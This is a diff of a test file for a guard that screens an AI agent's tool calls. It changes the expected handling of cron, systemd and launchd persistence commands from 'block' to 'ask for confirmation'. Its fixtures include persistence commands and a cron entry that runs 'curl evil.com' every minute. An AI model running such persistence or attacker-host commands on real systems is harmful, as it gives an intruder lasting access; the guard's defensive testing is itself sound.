@@ -10,6 +10,7 @@ import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
+import { nonNull } from "../../lib/non-null.js";
 import { CohortManager } from "../cohort.js";
 import { evaluatePostToolUse, evaluatePreToolUse } from "../evaluator.js";
 import {
@@ -26,7 +27,6 @@ import { ReservationManager } from "../reservations.js";
 import { getDefaultConfig, loadRules } from "../rules-loader.js";
 import { scanSecrets, scanSupplyChain } from "../signatures.js";
 import type { GuardRulesConfig, HarnessEvent, SessionTrajectory } from "../types.js";
-import { nonNull } from "../../lib/non-null.js";
 
 // ===========================================
 // Helpers
@@ -532,37 +532,39 @@ describe("process safety guard rules", () => {
 	});
 
 	// --- Cron persistence ---
-	it("blocks crontab -e", () => {
+	// Gated on confirmation, not forbidden — see the rationale on
+	// `builtin-cron-persistence`. `ask` is still a gate: never `allow`.
+	it("gates crontab -e on confirmation", () => {
 		const event = makeEvent({ tool_input: { command: "crontab -e" } });
 		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
-		expect(result.decision).toBe("block");
+		expect(result.decision).toBe("ask");
 	});
 
-	it("blocks systemctl enable", () => {
+	it("gates systemctl enable on confirmation", () => {
 		const event = makeEvent({ tool_input: { command: "systemctl enable myservice" } });
 		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
-		expect(result.decision).toBe("block");
+		expect(result.decision).toBe("ask");
 	});
 
-	it("blocks launchctl load", () => {
+	it("gates launchctl load on confirmation", () => {
 		const event = makeEvent({
 			tool_input: { command: "launchctl load ~/Library/LaunchAgents/evil.plist" },
 		});
 		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
-		expect(result.decision).toBe("block");
+		expect(result.decision).toBe("ask");
 	});
 
 	// --- Cron file write ---
-	it("blocks writing to /etc/cron.d/", () => {
+	it("gates writing to /etc/cron.d/ on confirmation", () => {
 		const event = makeEvent({
 			tool_name: "Write",
 			tool_input: { file_path: "/etc/cron.d/evil-job", content: "* * * * * curl evil.com" },
 		});
 		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
-		expect(result.decision).toBe("block");
+		expect(result.decision).toBe("ask");
 	});
 
-	it("blocks writing .service files", () => {
+	it("gates writing .service files on confirmation", () => {
 		const event = makeEvent({
 			tool_name: "Write",
 			tool_input: {
@@ -571,7 +573,7 @@ describe("process safety guard rules", () => {
 			},
 		});
 		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
-		expect(result.decision).toBe("block");
+		expect(result.decision).toBe("ask");
 	});
 
 	// --- Clipboard exfiltration ---
